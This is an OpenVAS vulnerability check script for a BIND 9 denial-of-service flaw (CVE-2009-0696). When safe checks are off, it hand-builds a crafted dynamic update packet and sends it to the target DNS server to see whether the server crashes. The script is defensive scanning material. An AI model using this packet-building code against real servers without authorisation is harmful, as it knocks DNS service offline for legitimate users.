###############################################################################
# OpenVAS Vulnerability Test
#
# ISC BIND 9 Remote Dynamic Update Message Denial of Service Vulnerability
#
# Authors:
# Michael Meyer <michael.meyer@greenbone.net>
#
# Copyright:
# Copyright (c) 2009 Greenbone Networks GmbH
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

CPE = "cpe:/a:isc:bind";

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.100251");
  script_version("2019-05-13T14:05:09+0000");
  script_tag(name:"last_modification", value:"2019-05-13 14:05:09 +0000 (Mon, 13 May 2019)");
  script_tag(name:"creation_date", value:"2009-07-29 21:36:35 +0200 (Wed, 29 Jul 2009)");
  script_tag(name:"cvss_base", value:"4.3");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:M/Au:N/C:N/I:N/A:P");
  script_bugtraq_id(35848);
  script_cve_id("CVE-2009-0696");
  script_name("ISC BIND 9 Remote Dynamic Update Message Denial of Service Vulnerability");
  script_category(ACT_MIXED_ATTACK);
  script_family("Denial of Service");
  script_copyright("This script is Copyright (C) 2009 Greenbone Networks GmbH");
  script_dependencies("bind_version.nasl");
  script_mandatory_keys("ISC BIND/installed");

  script_xref(name:"URL", value:"http://www.securityfocus.com/bid/35848");
  script_xref(name:"URL", value:"https://bugzilla.redhat.com/show_bug.cgi?id=514292");
  script_xref(name:"URL", value:"http://bugs.debian.org/cgi-bin/bugreport.cgi?bug=538975");
  script_xref(name:"URL", value:"http://www.isc.org/products/BIND/");
  script_xref(name:"URL", value:"https://www.isc.org/node/474");
  script_xref(name:"URL", value:"http://www.kb.cert.org/vuls/id/725188");

  script_tag(name:"impact", value:"Successfully exploiting this issue allows remote attackers to crash
  affected DNS servers, denying further service to legitimate users.");

  script_tag(name:"affected", value:"Versions prior to BIND 9.4.3-P3, 9.5.1-P3, and 9.6.1-P1 are
  vulnerable.");

  script_tag(name:"solution", value:"The vendor released an advisory and fixes to address this issue.
  Please see the references for more information.");

  script_tag(name:"summary", value:"ISC BIND is prone to a remote denial-of-service vulnerability because
  the application fails to properly handle specially crafted dynamic update requests.");

  script_tag(name:"qod_type", value:"remote_banner_unreliable");
  script_tag(name:"solution_type", value:"VendorFix");

  exit(0);
}

include("version_func.inc");
include("host_details.inc");

function build_pkt( zone ) {

  local_var zone, zone_data, rrset, len, pkt_data;

  foreach zone_part( split( zone, sep:".", keep:FALSE ) ) {
    zone_data += raw_string( strlen( zone_part ) ) + zone_part;
  }

  rrset  = raw_string( 0x01 ) + int( 1 ) + raw_string( 0xc0, 0x0c );
  len    = ( strlen( zone_data + 1 ) + strlen( rrset ) + 12 );

  pkt_data = raw_string( 0xa7, 0x5e, 0x28, 0x00, 0x00, 0x01,
                         0x00, 0x01, 0x00, 0x01, 0x00, 0x00 ) +
                         zone_data +
             raw_string( 0x00, 0x00, 0x06, 0x00, 0x01 ) +
                         rrset +
             raw_string( 0x00, 0xff, 0x00, 0x01, 0x00, 0x00,
                         0x00, 0x00, 0x00, 0x00, 0xc0, len,
                         0x00, 0xff, 0x00, 0xff, 0x00, 0x00,
                         0x00, 0x00, 0x00, 0x00 );
  return pkt_data;
}

if( ! port = get_app_port( cpe:CPE ) )
  exit( 0 );

if( ! infos = get_app_version_and_proto( cpe:CPE, port:port ) )
  exit( 0 );

version = infos["version"];
proto = infos["proto"];

if( version ) {
  version = str_replace( find:"-", string: version, replace:"." ); # modify for version check.
}

if( safe_checks() ) {

  if( ! version ) exit( 0 );

  if( version_in_range( version:version, test_version:"9.6", test_version2:"9.6.1" ) ||
      version_in_range( version:version, test_version:"9.5", test_version2:"9.5.1.P2") ||
      version_in_range( version:version, test_version:"9",   test_version2:"9.4.3.P2" ) ) {

     info = 'The scanner only checked the version number (from TXT record in the\nChaos class) because "safe checks" are enabled.';
     security_message( port:port, data:info, proto:proto );
     exit( 0 );
  }

} else {

  if( proto == "tcp" ) {
    soc = open_sock_tcp( port );
    if( ! soc ) exit( 0 );
  } else {
    soc = open_sock_udp( port );
    if( ! soc ) exit( 0 );
  }

  ZONES = make_list( "0.0.127.in-addr.arpa", "127.in-addr.arpa", "0.0.0.127.in-addr.arpa", "127.0.0.in-addr.arpa" );

  foreach zone( ZONES ) {

    data = build_pkt( zone );

    send( socket:soc, data:data );
    buf = recv( socket:soc, length:4096 );
    if( buf == 0 ) {
      info = 'It seems that the scanner was able to crash the remote Bind. Please check its status right now.';
      security_message( port:port, data:info, proto:proto );
      close( soc );
      exit( 0 );
    }
  }
  close( soc );

  # exploit failed. Check version anyway.
  if( version ) {
    if( version_in_range( version:version, test_version:"9.6", test_version2:"9.6.1" ) ||
        version_in_range( version:version, test_version:"9.5", test_version2:"9.5.1.P2" ) ||
        version_in_range( version:version, test_version:"9",   test_version2:"9.4.3.P2" ) ) {

      info = 'It seems that the scanner was not able to crash the remote Bind. According to its version number the remote version of BIND is anyway vulnerable. Please check its status right now.';
      security_message( port:port, data:info, proto:proto );
      exit( 0 );
    }
  }
}

exit( 99 );